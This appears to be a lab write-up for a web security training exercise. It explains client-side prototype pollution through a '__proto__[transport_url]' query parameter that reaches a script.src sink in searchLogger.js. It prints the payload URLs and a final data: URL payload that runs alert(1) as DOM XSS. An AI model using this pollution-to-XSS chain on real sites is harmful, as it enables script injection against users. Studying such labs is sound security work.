Vulnerability Summary

The application allows arbitrary properties to be added to Object.prototype through parameters supplied in the query string.

The property:

transport_url

can be controlled through prototype pollution.

The application subsequently accesses this property through a config object and uses it as the source of a dynamically created <script> element.

The exploitation chain is:

Query String
     ↓
__proto__[transport_url]
     ↓
Object.prototype.transport_url
     ↓
config.transport_url
     ↓
script.src
     ↓
data:,alert(1);
     ↓
DOM XSS
Reconnaissance
1. Identifying the Prototype Pollution Source

The application was first tested to determine whether Object.prototype could be polluted through the query string.

The following payload was used:

/?__proto__[foo]=bar

Example:

https://LAB-ID.web-security-academy.net/?__proto__[foo]=bar

The browser DevTools console was then opened and the following JavaScript was executed:

Object.prototype

The resulting object contained the injected property:

foo: "bar"

The pollution could also be verified directly with:

Object.prototype.foo

which returned:

bar

This confirmed the existence of a client-side prototype pollution source.

Identifying the Gadget
2. JavaScript Analysis

The JavaScript loaded by the application was inspected through:

DevTools → Sources

The file:

searchLogger.js

contained functionality similar to:

async function searchLogger() {
    let config = {
        params: deparam(new URL(location).searchParams.toString())
    };

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
}

The following code was particularly interesting:

if(config.transport_url) {

followed by:

script.src = config.transport_url;

This represented a potential DOM XSS gadget, because a controllable property was being used as the source of a dynamically created script.

Prototype Chain Analysis

The config object did not need to contain transport_url as an own property.

JavaScript searches for properties through the object's prototype chain.

Conceptually:

config
  │
  └── Object.prototype

For example:

const config = {};

Object.prototype.transport_url = "foo";

console.log(config.transport_url);

returns:

foo

Therefore, if the attacker can control:

Object.prototype.transport_url

they can indirectly control:

config.transport_url
Exploitation
3. Controlling transport_url

After identifying both the prototype pollution source and the gadget, the following payload was supplied:

/?__proto__[transport_url]=foo

Example:

https://LAB-ID.web-security-academy.net/?__proto__[transport_url]=foo

The page was then inspected using:

DevTools → Elements

A dynamically generated script element was observed:

<script src="foo"></script>

This confirmed that the polluted property had successfully reached the script.src sink.

The complete flow was:

__proto__[transport_url]
        ↓
Object.prototype.transport_url
        ↓
config.transport_url
        ↓
script.src
Executing JavaScript
4. Final Payload

The arbitrary value:

foo

was replaced with a data: URL containing JavaScript:

/?__proto__[transport_url]=data:,alert(1);

Example:

https://LAB-ID.web-security-academy.net/?__proto__[transport_url]=data:,alert(1);

The polluted value was eventually assigned to:

script.src

resulting in:

<script src="data:,alert(1);"></script>

The browser interpreted the data: URL as JavaScript and executed:

alert(1)

